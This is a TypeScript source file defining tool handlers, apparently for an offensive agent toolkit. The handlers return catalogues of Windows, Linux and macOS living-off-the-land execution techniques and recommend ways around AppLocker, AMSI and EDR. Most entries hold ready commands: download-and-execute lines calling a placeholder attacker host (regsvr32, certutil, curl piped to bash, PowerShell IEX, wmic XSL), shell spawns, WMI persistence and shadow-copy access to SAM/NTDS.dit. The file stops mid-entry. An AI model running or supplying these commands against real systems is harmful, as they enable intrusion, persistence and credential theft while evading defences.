import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform, UnifiedLOLEntry } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

interface ExecutionTechnique {
  technique: string;
  description: string;
  platform: Platform | "multi";
  binary: string;
  command: string;
  payload_type: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
  evasion_notes: string;
}

// ── exec_proxy ────────────────────────────────────────────────────────────────

const exec_proxy: ToolDef = {
  name: "exec_proxy",
  description:
    "Find proxy execution techniques using signed/trusted LOL binaries to execute arbitrary code while evading application whitelisting (T1218)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux", "windows", "macos"])
      .default("windows")
      .describe("Target platform for proxy execution techniques"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbExec = ctx.knowledgeBase.searchByFunction("command_execution", platform);
    const kbAwlBypass = ctx.knowledgeBase.searchByFunction("awl_bypass", platform);
    const kbProxy = ctx.knowledgeBase.searchByKeyword("proxy", platform);
    const kbEntries = deduplicateByBinary([...kbExec, ...kbAwlBypass, ...kbProxy])
      .filter(e => e.platform === platform);

    const techniques: ExecutionTechnique[] = [];

    if (platform === "windows") {
      techniques.push(
        {
          technique: "Rundll32 Proxy Execution",
          description: "Use rundll32.exe to load and execute a malicious DLL or JavaScript via URL protocol handlers",
          platform: "windows",
          binary: "rundll32.exe",
          command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe /c whoami\")",
          payload_type: "dll_or_script",
          stealth_score: 3,
          attck_ids: ["T1218.011"],
          prerequisites: ["User-level access"],
          detection_notes: "Sysmon Event 1 (rundll32 spawning cmd). EDR monitors rundll32 argument patterns.",
          evasion_notes: "Microsoft-signed binary. Commonly used legitimately — blends with normal activity.",
        },
        {
          technique: "Mshta Proxy Execution",
          description: "Use mshta.exe to execute HTA files or inline VBScript/JScript for code execution",
          platform: "windows",
          binary: "mshta.exe",
          command: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"cmd.exe /c whoami\"\", 0:close\")",
          payload_type: "hta_or_script",
          stealth_score: 3,
          attck_ids: ["T1218.005"],
          prerequisites: ["User-level access"],
          detection_notes: "Sysmon Event 1 (mshta.exe execution). Well-known proxy — many detection rules exist.",
          evasion_notes: "Microsoft-signed binary. Can execute inline scripts or remote HTA files.",
        },
        {
          technique: "Regsvr32 Proxy Execution (Squiblydoo)",
          description: "Use regsvr32.exe to download and execute a remote SCT file containing COM scriptlet payloads",
          platform: "windows",
          binary: "regsvr32.exe",
          command: "regsvr32 /s /n /u /i:http://<ATTACKER>/payload.sct scrobj.dll",
          payload_type: "sct_scriptlet",
          stealth_score: 2,
          attck_ids: ["T1218.010"],
          prerequisites: ["User-level access, outbound HTTP allowed"],
          detection_notes: "Sysmon Event 1 (regsvr32 with /i:http). Network connection from regsvr32. Well-detected.",
          evasion_notes: "Microsoft-signed. Bypasses AppLocker default rules. Can proxy execution from remote URLs.",
        },
        {
          technique: "CertUtil Proxy Download and Execute",
          description: "Use certutil.exe to download a payload from a remote URL and decode/execute it locally",
          platform: "windows",
          binary: "certutil.exe",
          command: "certutil.exe -urlcache -split -f http://<ATTACKER>/payload.exe C:\\Windows\\Temp\\payload.exe && C:\\Windows\\Temp\\payload.exe",
          payload_type: "remote_binary",
          stealth_score: 3,
          attck_ids: ["T1218", "T1105"],
          prerequisites: ["User-level access, outbound HTTP allowed"],
          detection_notes: "Sysmon Event 1 and Event 3 (certutil network connection). Well-detected by most EDRs.",
          evasion_notes: "Microsoft-signed. Dual use: download and base64 decode. URL cache creates artifacts.",
        },
        {
          technique: "CMSTP Proxy Execution",
          description: "Use cmstp.exe to install a malicious Connection Manager profile that executes arbitrary commands",
          platform: "windows",
          binary: "cmstp.exe",
          command: "cmstp.exe /s /ns C:\\path\\to\\evil.inf",
          payload_type: "inf_profile",
          stealth_score: 1,
          attck_ids: ["T1218.003"],
          prerequisites: ["User-level access, crafted INF file"],
          detection_notes: "Monitor cmstp.exe with /s flag. Less commonly monitored than other proxies.",
          evasion_notes: "Microsoft-signed. Can bypass UAC. Rarely monitored in many environments.",
        },
        {
          technique: "Forfiles Proxy Execution",
          description: "Use forfiles.exe to execute commands as child processes, bypassing command-line logging restrictions",
          platform: "windows",
          binary: "forfiles.exe",
          command: 'forfiles /p C:\\Windows\\System32 /m notepad.exe /c "cmd.exe /c whoami"',
          payload_type: "command",
          stealth_score: 2,
          attck_ids: ["T1218"],
          prerequisites: ["User-level access"],
          detection_notes: "Monitor forfiles.exe spawning child processes. Less common detection target.",
          evasion_notes: "Microsoft-signed. Command execution appears as child of forfiles, not original parent.",
        },
      );
    }

    if (platform === "linux") {
      techniques.push(
        {
          technique: "GTFOBins Shell via awk",
          description: "Use awk to spawn an interactive shell, bypassing restricted shell environments",
          platform: "linux",
          binary: "awk",
          command: "awk 'BEGIN {system(\"/bin/bash\")}'",
          payload_type: "shell",
          stealth_score: 2,
          attck_ids: ["T1218"],
          prerequisites: ["Access to awk binary"],
          detection_notes: "Monitor awk spawning shell processes. Process tree analysis.",
          evasion_notes: "Common system utility. Blends with legitimate text processing.",
        },
        {
          technique: "GTFOBins Proxy via find",
          description: "Use find's -exec parameter to execute arbitrary commands without direct shell invocation",
          platform: "linux",
          binary: "find",
          command: "find /tmp -name \"*.txt\" -exec /bin/bash -c 'whoami' \\;",
          payload_type: "command",
          stealth_score: 2,
          attck_ids: ["T1218"],
          prerequisites: ["Access to find binary"],
          detection_notes: "Monitor find -exec with shell arguments. Auditd execve monitoring.",
          evasion_notes: "Standard utility. Legitimate use of -exec makes detection context-dependent.",
        },
        {
          technique: "Python Proxy Execution",
          description: "Use Python's os.system or subprocess module to execute commands from within an interpreted context",
          platform: "linux",
          binary: "python3",
          command: "python3 -c 'import os; os.system(\"/bin/bash\")'",
          payload_type: "shell",
          stealth_score: 3,
          attck_ids: ["T1059.006"],
          prerequisites: ["Python installed"],
          detection_notes: "Monitor python spawning shell processes. Script block analysis.",
          evasion_notes: "Commonly installed. Inline -c execution leaves minimal traces.",
        },
      );
    }

    if (platform === "macos") {
      techniques.push(
        {
          technique: "osascript Proxy Execution",
          description: "Use osascript to execute AppleScript or JavaScript for Automation (JXA) payloads",
          platform: "macos",
          binary: "osascript",
          command: "osascript -e 'do shell script \"whoami\"'",
          payload_type: "applescript",
          stealth_score: 3,
          attck_ids: ["T1059.002"],
          prerequisites: ["User-level access"],
          detection_notes: "Monitor osascript process creation. TCC may restrict certain operations.",
          evasion_notes: "Apple-signed utility. AppleScript is a standard macOS automation tool.",
        },
        {
          technique: "Curl Proxy Download and Execute",
          description: "Use curl to download and pipe directly to bash for fileless execution",
          platform: "macos",
          binary: "curl",
          command: "curl -s http://<ATTACKER>/payload.sh | bash",
          payload_type: "remote_script",
          stealth_score: 3,
          attck_ids: ["T1218", "T1105"],
          prerequisites: ["Outbound HTTP allowed"],
          detection_notes: "Monitor curl piped to bash. Network connection followed by script execution.",
          evasion_notes: "Common pattern for legitimate software installation scripts.",
        },
      );
    }

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const availableBinaries = session.state.installedBinaries.filter(b =>
        ["rundll32.exe", "mshta.exe", "regsvr32.exe", "certutil.exe", "cmstp.exe",
          "forfiles.exe", "awk", "find", "python3", "osascript", "curl"].includes(b.toLowerCase()),
      );

      sessionContext = {
        environment_id: session.id,
        platform: session.state.platform,
        privilege_level: session.state.privilegeLevel,
        available_proxy_binaries: availableBinaries,
        applocker_enabled: session.state.appLockerEnabled,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.appLockerEnabled
          ? "AppLocker detected — proxy execution via signed LOLBins is the primary bypass vector."
          : "No application whitelisting detected — proxy execution still useful for defense evasion.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── exec_compile ──────────────────────────────────────────────────────────────

const exec_compile: ToolDef = {
  name: "exec_compile",
  description:
    "Find compile-and-execute techniques using native development tools (csc.exe, msbuild.exe, gcc) to compile and run payloads inline (T1127)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux", "windows", "macos"])
      .default("windows")
      .describe("Target platform for compile-and-execute techniques"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbCompile = ctx.knowledgeBase.searchByFunction("compile", platform);
    const kbExec = ctx.knowledgeBase.searchByFunction("command_execution", platform);
    const kbBuild = ctx.knowledgeBase.searchByKeyword("build", platform);
    const kbEntries = deduplicateByBinary([...kbCompile, ...kbExec, ...kbBuild])
      .filter(e => e.platform === platform);

    const techniques: ExecutionTechnique[] = [];

    if (platform === "windows") {
      techniques.push(
        {
          technique: "MSBuild Inline Task Execution",
          description: "Use msbuild.exe to compile and execute inline C# code embedded in an XML project file, bypassing AppLocker",
          platform: "windows",
          binary: "msbuild.exe",
          command: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\path\\to\\payload.csproj",
          payload_type: "csproj_inline_task",
          stealth_score: 1,
          attck_ids: ["T1127.001"],
          prerequisites: [".NET Framework installed (default on Windows)"],
          detection_notes: "Sysmon Event 1 (msbuild.exe). Monitor MSBuild loading non-standard project files.",
          evasion_notes: "Microsoft-signed. Default AppLocker rules allow MSBuild. Compiles and executes in memory.",
        },
        {
          technique: "CSC.exe Inline Compilation",
          description: "Use the C# compiler (csc.exe) to compile source code on-the-fly and execute the resulting binary",
          platform: "windows",
          binary: "csc.exe",
          command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\payload.exe C:\\path\\to\\payload.cs && C:\\Windows\\Temp\\payload.exe',
          payload_type: "csharp_source",
          stealth_score: 2,
          attck_ids: ["T1127"],
          prerequisites: [".NET Framework installed"],
          detection_notes: "Sysmon Event 1 (csc.exe followed by new binary). File creation events.",
          evasion_notes: "Microsoft-signed compiler. Source code can be obfuscated.",
        },
        {
          technique: "VBC.exe Visual Basic Compilation",
          description: "Use the Visual Basic compiler to compile and execute VB.NET payloads on target",
          platform: "windows",
          binary: "vbc.exe",
          command: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe /out:C:\\Windows\\Temp\\payload.exe C:\\path\\to\\payload.vb && C:\\Windows\\Temp\\payload.exe",
          payload_type: "vb_source",
          stealth_score: 1,
          attck_ids: ["T1127"],
          prerequisites: [".NET Framework installed"],
          detection_notes: "Sysmon Event 1 (vbc.exe execution). Less commonly monitored than csc.exe.",
          evasion_notes: "Microsoft-signed compiler. VB source may evade signature-based detection.",
        },
        {
          technique: "InstallUtil Execution",
          description: "Use InstallUtil.exe to execute code in a .NET assembly's Installer class, bypassing application whitelisting",
          platform: "windows",
          binary: "InstallUtil.exe",
          command: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\path\\to\\payload.dll",
          payload_type: "dotnet_assembly",
          stealth_score: 2,
          attck_ids: ["T1218.004"],
          prerequisites: [".NET Framework installed, crafted assembly with Installer class"],
          detection_notes: "Sysmon Event 1 (InstallUtil.exe with /U flag). Well-known bypass technique.",
          evasion_notes: "Microsoft-signed. Uninstall mode (/U) triggers custom code in Uninstall() method.",
        },
      );
    }

    if (platform === "linux") {
      techniques.push(
        {
          technique: "GCC Inline Compilation",
          description: "Use gcc to compile C source code on-the-fly and execute the resulting binary",
          platform: "linux",
          binary: "gcc",
          command: 'echo \'#include <stdlib.h>\\nint main(){system("/bin/bash");return 0;}\' > /tmp/.p.c && gcc -o /tmp/.p /tmp/.p.c && /tmp/.p && rm /tmp/.p /tmp/.p.c',
          payload_type: "c_source",
          stealth_score: 2,
          attck_ids: ["T1127"],
          prerequisites: ["GCC installed (common on development systems)"],
          detection_notes: "Monitor gcc spawning new binaries followed by execution. Auditd execve rules.",
          evasion_notes: "Standard development tool. Compiled binary has no known signature.",
        },
        {
          technique: "Perl Inline Execution",
          description: "Use Perl's eval or system functions to execute arbitrary commands without separate scripts",
          platform: "linux",
          binary: "perl",
          command: "perl -e 'exec \"/bin/bash\";'",
          payload_type: "perl_inline",
          stealth_score: 2,
          attck_ids: ["T1059.006"],
          prerequisites: ["Perl installed"],
          detection_notes: "Monitor perl -e with shell execution. Process tree analysis.",
          evasion_notes: "Standard scripting language. Inline execution leaves minimal disk artifacts.",
        },
      );
    }

    if (platform === "macos") {
      techniques.push(
        {
          technique: "Swift Inline Compilation",
          description: "Use swift compiler to compile and execute Swift code from the command line",
          platform: "macos",
          binary: "swift",
          command: 'echo "import Foundation; let task = Process(); task.executableURL = URL(fileURLWithPath: \\"/bin/bash\\"); try task.run()" | swift -',
          payload_type: "swift_source",
          stealth_score: 1,
          attck_ids: ["T1127"],
          prerequisites: ["Xcode Command Line Tools installed"],
          detection_notes: "Monitor swift compiler usage with stdin piping. Unusual for non-developer machines.",
          evasion_notes: "Apple development tool. Compiled code runs in-process.",
        },
        {
          technique: "Clang Inline Compilation",
          description: "Use clang to compile C/C++ source on macOS and execute the resulting binary",
          platform: "macos",
          binary: "clang",
          command: 'echo \'#include <stdlib.h>\\nint main(){system("/bin/bash");return 0;}\' > /tmp/.p.c && clang -o /tmp/.p /tmp/.p.c && /tmp/.p && rm /tmp/.p /tmp/.p.c',
          payload_type: "c_source",
          stealth_score: 2,
          attck_ids: ["T1127"],
          prerequisites: ["Xcode Command Line Tools installed"],
          detection_notes: "Monitor clang creating and executing binaries. File creation in /tmp/.",
          evasion_notes: "Standard macOS development tool. Compiled binary lacks code signature.",
        },
      );
    }

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const compilers = session.state.installedBinaries.filter(b =>
        ["msbuild.exe", "csc.exe", "vbc.exe", "installutil.exe", "gcc", "g++",
          "clang", "swift", "perl", "rustc"].includes(b.toLowerCase()),
      );

      sessionContext = {
        environment_id: session.id,
        platform: session.state.platform,
        available_compilers: compilers,
        dotnet_installed: (session.state as any).dotnetInstalled,
        recommendations: compilers.length > 0
          ? `Found ${compilers.length} compiler(s) available: ${compilers.join(", ")}. Inline compilation is viable.`
          : "No compilers detected. Consider uploading a precompiled payload or using interpreter-based execution.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── exec_script_host ──────────────────────────────────────────────────────────

const exec_script_host: ToolDef = {
  name: "exec_script_host",
  description:
    "Find script host abuse techniques using Windows Script Host (wscript/cscript), PowerShell, and platform-native interpreters (T1059)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux", "windows", "macos"])
      .default("windows")
      .describe("Target platform for script host abuse techniques"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbExec = ctx.knowledgeBase.searchByFunction("command_execution", platform);
    const kbShell = ctx.knowledgeBase.searchByFunction("shell", platform);
    const kbScript = ctx.knowledgeBase.searchByKeyword("script", platform);
    const kbEntries = deduplicateByBinary([...kbExec, ...kbShell, ...kbScript])
      .filter(e => e.platform === platform);

    const techniques: ExecutionTechnique[] = [];

    if (platform === "windows") {
      techniques.push(
        {
          technique: "WScript.exe VBS Execution",
          description: "Use wscript.exe to execute VBScript files for command execution and payload delivery",
          platform: "windows",
          binary: "wscript.exe",
          command: 'wscript.exe C:\\path\\to\\payload.vbs',
          payload_type: "vbscript",
          stealth_score: 3,
          attck_ids: ["T1059.005"],
          prerequisites: ["User-level access, Windows Script Host not disabled"],
          detection_notes: "Sysmon Event 1 (wscript.exe). Script block logging. AMSI inspection.",
          evasion_notes: "Microsoft-signed. Can execute from network shares or downloaded files.",
        },
        {
          technique: "CScript.exe JScript Execution",
          description: "Use cscript.exe to execute JScript (.js) files from the command line for console-based payload execution",
          platform: "windows",
          binary: "cscript.exe",
          command: "cscript.exe //nologo C:\\path\\to\\payload.js",
          payload_type: "jscript",
          stealth_score: 3,
          attck_ids: ["T1059.007"],
          prerequisites: ["User-level access"],
          detection_notes: "Sysmon Event 1 (cscript.exe). AMSI hooks on JScript. Script content logging.",
          evasion_notes: "Console-mode execution — no GUI window. //nologo suppresses banner.",
        },
        {
          technique: "PowerShell Encoded Command",
          description: "Use PowerShell with -EncodedCommand to execute Base64-encoded payloads, evading simple string detection",
          platform: "windows",
          binary: "powershell.exe",
          command: "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>",
          payload_type: "powershell_encoded",
          stealth_score: 3,
          attck_ids: ["T1059.001"],
          prerequisites: ["PowerShell available (default on modern Windows)"],
          detection_notes: "PowerShell script block logging (Event 4104). AMSI. -EncodedCommand is a well-known indicator.",
          evasion_notes: "Can bypass simple string matching. AMSI decodes before inspection on modern systems.",
        },
        {
          technique: "PowerShell Constrained Language Bypass",
          description: "Bypass PowerShell Constrained Language Mode using .NET reflection or custom runspace",
          platform: "windows",
          binary: "powershell.exe",
          command: 'powershell.exe -Version 2 -Command "& {IEX (New-Object Net.WebClient).DownloadString(\'http://<ATTACKER>/payload.ps1\')}"',
          payload_type: "powershell_remote",
          stealth_score: 2,
          attck_ids: ["T1059.001"],
          prerequisites: ["PowerShell v2 engine available (may not be on newer systems)"],
          detection_notes: "Monitor PowerShell v2 engine usage. Network connections from PowerShell.",
          evasion_notes: "PSv2 lacks AMSI and script block logging. Being removed from modern Windows.",
        },
      );
    }

    if (platform === "linux") {
      techniques.push(
        {
          technique: "Bash Heredoc Execution",
          description: "Use bash heredoc to execute multi-line scripts without creating script files on disk",
          platform: "linux",
          binary: "bash",
          command: "bash << 'HEREDOC'\n#!/bin/bash\nwhoami\nid\nuname -a\nHEREDOC",
          payload_type: "bash_heredoc",
          stealth_score: 2,
          attck_ids: ["T1059.004"],
          prerequisites: ["Bash shell access"],
          detection_notes: "Auditd execve monitoring. Process command-line logging.",
          evasion_notes: "No file on disk. Heredoc content may not appear in process arguments.",
        },
        {
          technique: "Busybox Multi-call Execution",
          description: "Use busybox as a multi-call binary to access utilities that may be restricted individually",
          platform: "linux",
          binary: "busybox",
          command: "busybox sh -c 'whoami && id'",
          payload_type: "shell",
          stealth_score: 2,
          attck_ids: ["T1059.004"],
          prerequisites: ["Busybox available (common in containers and embedded systems)"],
          detection_notes: "Monitor busybox invocations. Less commonly monitored than direct shell use.",
          evasion_notes: "Single binary provides many utilities. Common in Docker containers.",
        },
      );
    }

    if (platform === "macos") {
      techniques.push(
        {
          technique: "JXA (JavaScript for Automation) Execution",
          description: "Use osascript with -l JavaScript to execute JavaScript for Automation payloads on macOS",
          platform: "macos",
          binary: "osascript",
          command: "osascript -l JavaScript -e 'ObjC.import(\"stdlib\"); $.system(\"/bin/bash -c whoami\")'",
          payload_type: "jxa",
          stealth_score: 2,
          attck_ids: ["T1059.007"],
          prerequisites: ["User-level access"],
          detection_notes: "Monitor osascript with -l JavaScript flag. Endpoint security framework events.",
          evasion_notes: "Apple-signed utility. JXA provides full ObjC bridge for system access.",
        },
        {
          technique: "AppleScript Shell Execution",
          description: "Use AppleScript's do shell script to execute arbitrary commands with optional admin privileges",
          platform: "macos",
          binary: "osascript",
          command: "osascript -e 'do shell script \"whoami\" with administrator privileges'",
          payload_type: "applescript",
          stealth_score: 3,
          attck_ids: ["T1059.002"],
          prerequisites: ["User-level access, admin password for privileged execution"],
          detection_notes: "Monitor osascript 'do shell script'. TCC and admin password prompt.",
          evasion_notes: "Standard macOS automation. With administrator privileges prompts for password.",
        },
      );
    }

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const scriptHosts = session.state.installedBinaries.filter(b =>
        ["wscript.exe", "cscript.exe", "powershell.exe", "pwsh.exe",
          "bash", "busybox", "osascript", "python3"].includes(b.toLowerCase()),
      );

      sessionContext = {
        environment_id: session.id,
        platform: session.state.platform,
        available_script_hosts: scriptHosts,
        amsi_enabled: session.state.amsiEnabled,
        constrained_language_mode: (session.state as any).constrainedLanguageMode,
        recommendations: (session.state as any).constrainedLanguageMode
          ? "Constrained Language Mode active — consider PSv2 downgrade or .NET-based bypass."
          : session.state.amsiEnabled
            ? "AMSI enabled — script content will be inspected. Consider obfuscation or compiled payloads."
            : "No script restrictions detected — direct script host execution is viable.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── exec_wmi ──────────────────────────────────────────────────────────────────

const exec_wmi: ToolDef = {
  name: "exec_wmi",
  description:
    "Find WMI-based local execution techniques for running commands via Windows Management Instrumentation without direct shell invocation (T1047)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (WMI is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbExec = ctx.knowledgeBase.searchByFunction("command_execution", platform);
    const kbWmi = ctx.knowledgeBase.searchByKeyword("wmi", platform);
    const kbWmic = ctx.knowledgeBase.searchByKeyword("wmic", platform);
    const kbEntries = deduplicateByBinary([...kbExec, ...kbWmi, ...kbWmic])
      .filter(e => e.platform === platform);

    const techniques: ExecutionTechnique[] = [
      {
        technique: "WMIC Local Process Create",
        description: "Use wmic.exe locally to spawn a process via Win32_Process.Create, executing commands without direct cmd.exe invocation",
        platform,
        binary: "wmic.exe",
        command: 'wmic process call create "cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt"',
        payload_type: "command",
        stealth_score: 2,
        attck_ids: ["T1047"],
        prerequisites: ["User-level access"],
        detection_notes: "Sysmon Event 1 (wmic.exe process call create). WMI operational event log.",
        evasion_notes: "Process is spawned by WmiPrvSE.exe, not the calling user's shell — breaks process tree.",
      },
      {
        technique: "WMI Event Subscription (Local Persistence)",
        description: "Create a WMI event subscription that triggers command execution on a specified event condition",
        platform,
        binary: "powershell.exe",
        command: `$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='LocalFilter'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name='LocalConsumer'; CommandLineTemplate='C:\\Windows\\Temp\\payload.exe'}; Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}`,
        payload_type: "wmi_subscription",
        stealth_score: 1,
        attck_ids: ["T1047", "T1546.003"],
        prerequisites: ["Administrator access"],
        detection_notes: "Sysmon WMI events (Event ID 19, 20, 21). WMI event subscription monitoring.",
        evasion_notes: "Fileless persistence — survives reboots. Execution triggered by system events.",
      },
      {
        technique: "WMI Class Method Execution via PowerShell",
        description: "Use PowerShell's Invoke-WmiMethod or Invoke-CimMethod to execute commands through WMI locally",
        platform,
        binary: "powershell.exe",
        command: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"',
        payload_type: "command",
        stealth_score: 2,
        attck_ids: ["T1047"],
        prerequisites: ["PowerShell access"],
        detection_notes: "PowerShell script block logging. WMI operational log.",
        evasion_notes: "Process created by WmiPrvSE.exe. PowerShell logging captures the command.",
      },
      {
        technique: "WMIC XSL Script Processing",
        description: "Use wmic.exe with /format flag to process a malicious XSL stylesheet containing JScript or VBScript",
        platform,
        binary: "wmic.exe",
        command: "wmic os get /format:\"http://<ATTACKER>/payload.xsl\"",
        payload_type: "xsl_stylesheet",
        stealth_score: 1,
        attck_ids: ["T1047", "T1220"],
        prerequisites: ["User-level access, outbound HTTP for remote XSL"],
        detection_notes: "Monitor wmic.exe with /format: pointing to remote URLs. Network connections from wmic.",
        evasion_notes: "XSL can contain arbitrary JScript. Bypasses many command-line detection rules.",
      },
      {
        technique: "WMI Shadow Copy Access",
        description: "Use WMI to access Volume Shadow Copies for reading protected files (SAM, NTDS.dit) without direct file access",
        platform,
        binary: "wmic.exe",
        command: 'wmic shadowcopy call create Volume="C:\\" && wmic shadowcopy list brief',
        payload_type: "shadow_copy",
        stealth_score: 2,
        attck_ids: ["T1047", "T1003.003"],
        prerequisites: ["Administrator access"],
        detection_notes: "Monitor shadow copy creation via WMI. Event ID 8222 (shadow copy created).",
        evasion_notes: "Shadow copies allow reading locked files. Access SAM/SYSTEM from shadow copy path.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        wmi_available: session.state.installedBinaries.some(b =>
          b.toLowerCase() === "wmic.exe",
        ),
        edr_detected: session.state.edrDetected,
        recommendations: session.state.edrDetected
          ? "EDR detected — WMI event subscriptions and XSL processing may evade process-tree-based detection."
          : "No EDR detected — all WMI execution techniques are viable.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── exec_mmc ──────────────────────────────────────────────────────────────────

const exec_mmc: ToolDef = {
  name: "exec_mmc",
  description:
    "Find MMC snap-in abuse techniques for executing code via Microsoft Management Console and its trusted components (T1218.014)",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (MMC is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbExec = ctx.knowledgeBase.searchByFunction("command_execution", platform);
    const kbAwl = ctx.knowledgeBase.searchByFunction("awl_bypass", platform);
    const kbMmc = ctx.knowledgeBase.searchByKeyword("mmc", platform);
    const kbEntries = deduplicateByBinary([...kbExec, ...kbAwl, ...kbMmc])
      .filter(e => e.platform === platform);

    const techniques: ExecutionTechnique[] = [
      {
        technique: "MMC Snap-in Command Execution",
        description: "Use mmc.exe to load a crafted MSC file containing Task Scheduler or other snap-ins to execute arbitrary commands",
        platform,
        binary: "mmc.exe",
        command: "mmc.exe C:\\path\\to\\malicious.msc",
        payload_type: "msc_file",
        stealth_score: 2,
        attck_ids: ["T1218.014"],
        prerequisites: ["User-level access, crafted MSC file"],
        detection_notes: "Sysmon Event 1 (mmc.exe loading non-standard MSC). File creation events for MSC files.",
        evasion_notes: "Microsoft-signed binary. MSC files are XML — can be crafted to execute arbitrary commands.",
      },
      {
        technique: "MMC20.Application DCOM Execution",
        description: "Abuse the MMC20.Application COM object to execute commands via the ExecuteShellCommand method",
        platform,
        binary: "powershell.exe",
        command: '$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1")); $mmc.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\\Windows\\Temp\\out.txt","7")',
        payload_type: "dcom_method",
        stealth_score: 1,
        attck_ids: ["T1218.014", "T1021.003"],
        prerequisites: ["Administrator access for DCOM activation"],
        detection_notes: "Monitor MMC20.Application COM instantiation. Sysmon Event 1 (mmc.exe spawning cmd).",
        evasion_notes: "DCOM-based execution — process spawned by mmc.exe, not PowerShell. Breaks process tree.",
      },
      {
        technique: "GfxDownloadWrapper.exe (Intel Graphics)",
        description: "Use GfxDownloadWrapper.exe (Intel Graphics driver component) to download files from remote URLs as a trusted binary",
        platform,
        binary: "GfxDownloadWrapper.exe",
        command: 'GfxDownloadWrapper.exe "http://<ATTACKER>/payload.exe" "C:\\Users\\Public\\payload.exe"',
        payload_type: "remote_download",
        stealth_score: 1,
        attck_ids: ["T1218", "T1105"],
        prerequisites: ["Intel Graphics driver installed"],
        detection_notes: "Monitor GfxDownloadWrapper.exe network connections. Unusual for non-driver operations.",
        evasion_notes: "Signed by Intel. Very rarely monitored. Only available on Intel GPU systems.",
      },
      {
        technique: "DFSvc.exe ClickOnce Execution",
        description: "Abuse dfsvc.exe (ClickOnce deployment) to download and execute .NET applications from remote URLs",
        platform,
        binary: "dfsvc.exe",
        command: 'rundll32.exe dfshim.dll,ShOpenVerbApplication http://<ATTACKER>/payload.application',
        payload_type: "clickonce_application",
        stealth_score: 1,
        attck_ids: ["T1218", "T1204.002"],
